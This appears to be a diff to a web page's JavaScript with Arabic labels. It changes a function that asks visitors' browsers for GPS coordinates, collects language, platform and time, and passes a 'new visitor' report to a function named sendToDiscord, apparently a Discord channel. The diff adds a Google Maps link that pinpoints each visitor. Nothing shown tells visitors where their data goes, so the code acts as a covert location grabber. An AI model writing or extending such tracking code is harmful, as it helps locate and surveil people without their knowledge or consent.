@@ -86,14 +86,16 @@
 
   const gatherInfo = async () => {
     let locationInfo = "📍 الموقع: لم يتم تحديد GPS\n";
+    let latitude, longitude;
 
     try {
       const position = await new Promise((resolve, reject) =>
         navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
       );
 
-      const { latitude, longitude, accuracy } = position.coords;
-      locationInfo = `📍 GPS:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n- دقة التقريب: ${accuracy} متر\n`;
+      latitude = position.coords.latitude;
+      longitude = position.coords.longitude;
+      locationInfo = `📍 GPS:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}\n`;
     } catch (e) {
       locationInfo = "📍 الموقع: المستخدم رفض أو لم يتم تحديد GPS\n";
     }
@@ -103,6 +105,9 @@
     const lang = navigator.language;
     const platform = navigator.platform;
     const now = new Date().toLocaleString();
+
+    // إضافة رابط خرائط جوجل باستخدام الإحداثيات
+    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
 
     const message = `
 🕵️‍♂️ زائر جديد دخل الموقع:
@@ -117,6 +122,8 @@ ${locationInfo}
 📱 الجهاز: ${platform}
 🌐 اللغة: ${lang}
 📅 الوقت: ${now}
+
+📍 الموقع على خرائط جوجل: [رابط الموقع](https://www.google.com/maps?q=${latitude},${longitude})
     `;
 
     await sendToDiscord(message);
